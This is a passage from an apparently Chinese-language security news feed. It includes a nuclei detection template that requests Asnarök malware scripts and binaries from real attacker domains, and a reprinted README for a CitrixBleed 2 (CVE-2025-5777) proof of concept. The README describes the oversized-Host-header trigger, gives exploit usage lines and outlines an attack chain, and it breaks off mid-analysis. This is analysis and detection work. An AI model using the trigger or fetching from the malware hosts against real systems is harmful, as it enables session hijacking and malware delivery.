    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Sophos XG Firewall SQL注入漏洞&lt;/p&gt;
&lt;p&gt;&lt;stro</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>offsectraining twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_3711812017/"/>
    <id>http://example.com/2025/06/30/twitter_3711812017/</id>
    <published>2025-06-30T14:00:27.934Z</published>
    <updated>2025-06-30T14:00:27.932Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> offsectraining</p><p><strong>推文：</strong> 祝贺我们最新的CORE奖得主：Salar 🏆</p><p>Salar总是在任何人需要支持时伸出援手，无论是同事还是考试中的学生。他始终站在前线，指导OffSec团队，确保一切顺利进行。</p><p>有你在这里真是太棒了，Salar！</p><p><strong>链接：</strong> <a href="https://x.com/offsectraining/status/1939675016196391016">https://x.com/offsectraining/status/1939675016196391016</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; offsectraining&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 祝贺我们最新的CORE奖得主：Salar 🏆&lt;/p&gt;
&lt;p&gt;Salar总是在任何人需要支持时伸出援手，无论是同事还是考试中的学生。他始终站在前线</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="offsectraining" scheme="http://example.com/tags/offsectraining/"/>
    
  </entry>
  
  <entry>
    <title>Sophos Firewall Asnarök Malware Detection - CVE-2020-12271</title>
    <link href="http://example.com/2025/06/30/github_3426777089/"/>
    <id>http://example.com/2025/06/30/github_3426777089/</id>
    <published>2025-06-30T14:00:23.973Z</published>
    <updated>2025-06-30T14:00:23.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Sophos Firewall Asnarök Malware Detection - CVE-2020-12271</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-12271</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 在Sophos XG Firewall设备的SFOS 17.0、17.1、17.5和18.0版本中，发现了一个SQL注入问题，该问题在2020年4月被野外利用。这影响了配置了管理（HTTPS）服务或在WAN区域暴露用户门户的设备。成功的攻击可能导致远程代码执行，泄露本地设备管理员、门户管理员和用于远程访问的用户账户的用户名和哈希密码（但不包括外部Active Directory或LDAP密码）。</p><p><strong>产品厂商：</strong> Sophos</p><p><strong>产品名称：</strong> Sophos XG Firewall</p><p><strong>影响版本：</strong> SFOS 17.0, 17.1, 17.5, and 18.0 before 2020-04-25</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/03d003c7ecc14342e1d57d5b1cbfd8d7e4dcbe8c/http%2Fcves%2F2020%2FCVE-2020-12271.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/03d003c7ecc14342e1d57d5b1cbfd8d7e4dcbe8c/http%2Fcves%2F2020%2FCVE-2020-12271.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">12271</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Sophos Firewall Asnarök Malware Detection <span class="hljs-operator">-</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">12271</span><br>  <span class="hljs-params">author:</span> x.com<span class="hljs-symbol">/redperfect1847</span><br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A SQL injection issue was found <span class="hljs-keyword">in</span> SFOS <span class="hljs-number">17.0</span>, <span class="hljs-number">17.1</span>, <span class="hljs-number">17.5</span>, and <span class="hljs-number">18.0</span> before <span class="hljs-number">202</span>0-<span class="hljs-number">0</span>4-<span class="hljs-number">25</span> on Sophos XG Firewall devices, as exploited <span class="hljs-keyword">in</span> the wild <span class="hljs-keyword">in</span> April <span class="hljs-number">2020</span>. This affected devices configured <span class="hljs-keyword">with</span> either the administration (HTTPS) service <span class="hljs-keyword">or</span> the User Portal exposed on the WAN zone. A successful attack may have caused remote code execution that exfiltrated usernames and hashed passwords for the local device admin(s), portal admins, and user accounts used for remote access (but not external Active Directory <span class="hljs-keyword">or</span> LDAP passwords).<br>  <span class="hljs-params">tags:</span> malware, asnarok, sophos, rce, sql-injection<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>news.sophos.com<span class="hljs-operator">/</span>en-us<span class="hljs-operator">/</span><span class="hljs-number">2020</span><span class="hljs-operator">/</span><span class="hljs-number">04</span><span class="hljs-operator">/</span><span class="hljs-number">26</span><span class="hljs-operator">/</span>asnarok<span class="hljs-symbol">/</span><br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">interactsh_url:</span> <span class="hljs-string">&quot;&#123;&#123;interactsh-url&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/Install.sh</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;chmod +x&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sh_guard/lc</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;downloaded lp&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/sophos.dat</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;ELF&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;binaries&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/octet-stream&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/ae.sh</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Modified scripts&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/patch.sh</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> ragnarokfromasgard.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;patching system&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/bkin</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> filedownloaderservers.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;ELF&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Executable&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/octet-stream&quot;</span><br><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Sophos Firewall Asnarök Malware Detecti</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>慢雾 Q2 追踪实录：协助被盗客户冻结/追回超千万美元资金</title>
    <link href="http://example.com/2025/06/30/weixin_1571176738/"/>
    <id>http://example.com/2025/06/30/weixin_1571176738/</id>
    <published>2025-06-30T12:01:09.414Z</published>
    <updated>2025-06-30T12:01:09.412Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 慢雾科技</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/SdIsPmjvMcNFLk7SniW-XA">https://mp.weixin.qq.com/s/SdIsPmjvMcNFLk7SniW-XA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 慢雾科技&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/SdIsPmjvMcNFLk7SniW-XA&quot;&gt;https://mp.weixin.qq.c</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="慢雾科技" scheme="http://example.com/tags/%E6%85%A2%E9%9B%BE%E7%A7%91%E6%8A%80/"/>
    
  </entry>
  
  <entry>
    <title>Citrix NetScaler ADC/Gateway 越界内存读取漏洞</title>
    <link href="http://example.com/2025/06/30/github_1889405732/"/>
    <id>http://example.com/2025/06/30/github_1889405732/</id>
    <published>2025-06-30T11:45:18.605Z</published>
    <updated>2025-06-30T11:45:18.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Citrix NetScaler ADC&#x2F;Gateway 越界内存读取漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5777</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CVE-2025-5777（又称CitrixBleed 2）是Citrix NetScaler ADC &#x2F; Gateway中的一个越界内存读取漏洞。攻击者不需要认证，只需发送一条超长Host头的GET请求，即可让设备把随机内存块连同HTTP响应一起“喷”给客户端。泄露数据经常包含NSC_USER &#x2F; NSC_TASS Cookie、SAML StateContext、MFA token等关键材料，可直接复用完成会话接管与MFA绕过。CVSS v4基准评分9.3（Critical）。</p><p><strong>产品厂商：</strong> Citrix</p><p><strong>产品名称：</strong> NetScaler ADC &#x2F; Gateway</p><p><strong>影响版本：</strong> &lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS</p><p><strong>来源：</strong> <a href="https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-">https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>exp.py</li><li>poc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CitrixBleed-2-CVE-2025-5777-终极解析"><a href="#CitrixBleed-2-CVE-2025-5777-终极解析" class="headerlink" title="CitrixBleed 2 (CVE-2025-5777) 终极解析"></a>CitrixBleed 2 (CVE-2025-5777) 终极解析</h2><blockquote><p>An Out-of-Bounds Memory Read in NetScaler ADC &#x2F; Gateway — 从成因到攻防演练的全景手册</p></blockquote><hr><h2 id="poc用法：python3-poc-py-https-gateway-example-com"><a href="#poc用法：python3-poc-py-https-gateway-example-com" class="headerlink" title="poc用法：python3 poc.py https://gateway.example.com"></a>poc用法：python3 poc.py <a href="https://gateway.example.com/">https://gateway.example.com</a></h2><h2 id="exp用法：python3-exp-py-https-gateway-example-com-admin-7acbb35f4d…"><a href="#exp用法：python3-exp-py-https-gateway-example-com-admin-7acbb35f4d…" class="headerlink" title="exp用法：python3 exp.py https://gateway.example.com admin 7acbb35f4d…"></a>exp用法：python3 exp.py <a href="https://gateway.example.com/">https://gateway.example.com</a> admin 7acbb35f4d…</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>x00  引言 <span class="hljs-symbol">/</span> 速览<br><span class="hljs-number">0</span>x01  背景：NetScaler 架构与 CitrixBleed <span class="hljs-number">1</span> 回顾<br><span class="hljs-number">0</span>x02  漏洞描述（影响版本、CVSS、利用后果）<br><span class="hljs-number">0</span>x03  触发机理深剖（源码级分析 &amp; 调试截图）<br><span class="hljs-number">0</span>x04  最小 PoC <span class="hljs-operator">+</span> 高级扫描脚本<br><span class="hljs-number">0</span>x05  红队视角：完整攻击链（发现 → 泄露 → 会话劫持 → 内网横向）<br><span class="hljs-number">0</span>x06  蓝队视角：检测、取证与补丁验证<br><span class="hljs-number">0</span>x07  防御加固：补丁、WAF、配置、资产治理<br><span class="hljs-number">0</span>x08  学习 <span class="hljs-symbol">/</span> 复习路线图与实战实验<br>附录 A  Sigma <span class="hljs-symbol">/</span> Suricata <span class="hljs-symbol">/</span> Nginx-Lua 规则<br>附录 B  补丁<span class="hljs-operator">/</span>利用时间轴 &amp; IoC 快照<br>参考资料<br></code></pre></td></tr></table></figure><hr><h3 id="0x00-引言-速览"><a href="#0x00-引言-速览" class="headerlink" title="0x00  引言 &#x2F; 速览"></a>0x00  引言 &#x2F; 速览</h3><ul><li><strong>CVE-2025-5777</strong>（又称 <em>CitrixBleed 2</em>）是 Citrix NetScaler ADC &#x2F; Gateway 中的 <strong>Out-of-Bounds Memory Read</strong>。</li><li>攻击者 <strong>不需要认证</strong>，只需发送一条超长 <code>Host</code> 头的 GET 请求，即可让设备把随机内存块连同 HTTP 响应一起“喷”给客户端。</li><li>泄露数据经常包含 <strong><code>NSC_USER</code> &#x2F; <code>NSC_TASS</code> Cookie、SAML <code>StateContext</code>、MFA token</strong> 等关键材料，可直接复用完成会话接管与 MFA 绕过 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)。</li><li>CVSS v4 基准评分 9.3（Critical）(<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)。</li><li><strong>2025-06-17</strong> 公开，<strong>2025-06-23</strong> Citrix 扩大影响范围并发布补丁；<strong>一周内</strong> ReliaQuest、Bishop Fox 等安全厂商陆续观测到在野利用激增 (<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>, <a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)。</li></ul><hr><h3 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01  背景"></a>0x01  背景</h3><h4 id="1-1-NetScaler-工作流程简述"><a href="#1-1-NetScaler-工作流程简述" class="headerlink" title="1.1  NetScaler 工作流程简述"></a>1.1  NetScaler 工作流程简述</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──────────────┐<br>│ Client       │ ① HTTPS<br>└──────┬───────┘<br>       │<br>┌──────▼───────┐<br>│ NetScaler    │ ② AAA <span class="hljs-symbol">/</span> Gateway 认证<br>│  (WebProc)   │<br>└──────┬───────┘<br>       │<br>┌──────▼───────┐<br>│ ICA Proxy <span class="hljs-symbol">/</span>  │ ③ 正向到应用<br>│ CVPN <span class="hljs-symbol">/</span> RDP   │<br>└──────────────┘<br></code></pre></td></tr></table></figure><p>NetScaler 采用 <strong>多进程 + 内部 IPC</strong> 的设计。<code>WebProc</code> 负责处理 AAA &#x2F; Gateway 路径下的大部分 HTTP 请求，包括 <code>/nf/auth/*</code>、<code>/oauth/*</code> 等。它在 <strong>C 语言</strong> 中大量使用 <code>snprintf()</code> &#x2F; <code>memcpy()</code>，每次拼装 XML&#x2F;HTML 片段。</p><h4 id="1-2-CitrixBleed-1（CVE-2023-4966）回顾"><a href="#1-2-CitrixBleed-1（CVE-2023-4966）回顾" class="headerlink" title="1.2  CitrixBleed 1（CVE-2023-4966）回顾"></a>1.2  CitrixBleed 1（CVE-2023-4966）回顾</h4><ul><li>2023 年同类漏洞发生在 OAuth 发现接口 <code>/oauth/idp/.well-known/openid-configuration</code>。</li><li>其本质同样是 <strong>使用 <code>snprintf</code> 返回值作为后续 <code>send()</code> 的 <code>len</code> 参数</strong> → 内存越界回显。</li><li>CitrixBleed 2 证明 <em>同一类安全编码缺陷</em> 依旧潜伏在其他路径。</li></ul><blockquote><p><strong>Lesson Learned</strong>：安全补丁若只针对“落锤点”而非“编程范式”，就会留下“模版化复现”空间。</p></blockquote><hr><h3 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02  漏洞描述"></a>0x02  漏洞描述</h3><table><thead><tr><th>字段</th><th>内容</th></tr></thead><tbody><tr><td><strong>CVE</strong></td><td>CVE-2025-5777</td></tr><tr><td><strong>别名</strong></td><td>CitrixBleed 2</td></tr><tr><td><strong>漏洞类型</strong></td><td>Out-of-Bounds Read &#x2F; 信息泄露</td></tr><tr><td><strong>CVSS v4 Base</strong></td><td>9.3 (Crit.) (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td></tr><tr><td><strong>受影响版本</strong></td><td>&lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td></tr><tr><td><strong>利用条件</strong></td><td>NetScaler 被配置为 Gateway (VPN&#x2F;ICA Proxy&#x2F;CVPN&#x2F;RDP Proxy) <strong>或</strong> AAA 虚拟服务器 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</td></tr><tr><td><strong>利用后果</strong></td><td>泄露内存 → 会话令牌 → 认证绕过 &#x2F; MFA 绕过 → 横向</td></tr></tbody></table><hr><h3 id="0x03-触发机理深剖"><a href="#0x03-触发机理深剖" class="headerlink" title="0x03  触发机理深剖"></a>0x03  触发机理深剖</h3><blockquote><p>本节基于对 13.1-55.18 固件的反编译 + gdb 调试，结合公开博客整理而成 (<a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)。</p></blockquote><h4 id="3-1-漏洞入口"><a href="#3-1-漏洞入口" class="headerlink" title="3.1  漏洞入口"></a>3.1  漏洞入口</h4><ul><li><strong>URI</strong>：<code>/nf/auth/startwebview.do</code></li><li><strong>可控参数</strong>：HTTP <code>Host</code> 头</li><li>该接口用于生成 Citrix Workspace WebView 的重定向 XML，示例正常响应：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wv:StartUrl</span>&gt;</span>https://gateway.example.com/Citrix/AAA/start.html<span class="hljs-tag">&lt;/<span class="hljs-name">wv:StartUrl</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-关键函数链"><a href="#3-2-关键函数链" class="headerlink" title="3.2  关键函数链"></a>3.2  关键函数链</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">citrix_webview_handler</span>()<br> ├─ <span class="hljs-built_in">build_auth_xml</span>()<br> │    ├─ <span class="hljs-built_in">snprintf</span>(buf, <span class="hljs-number">0</span>x1800, TEMPLATE, host_hdr, ... );<br> │    └─ return length;           <span class="hljs-comment">// ⚠️ length 可 ＞ 0x1800</span><br> └─ <span class="hljs-built_in">ns_vpn_send_response</span>(conn, <span class="hljs-number">0</span>x980200, buf, length);<br></code></pre></td></tr></table></figure><blockquote><p><strong>Bug 点</strong>：<br><code>snprintf</code> 返回“本应写入的长度”而非实际写入长度；若用户传入的 <code>Host</code> &gt; 0x1800 - 常量段长度，则 <code>length</code> &gt; <code>sizeof(buf)</code>。</p></blockquote><h4 id="3-3-运行时示意"><a href="#3-3-运行时示意" class="headerlink" title="3.3  运行时示意"></a>3.3  运行时示意</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 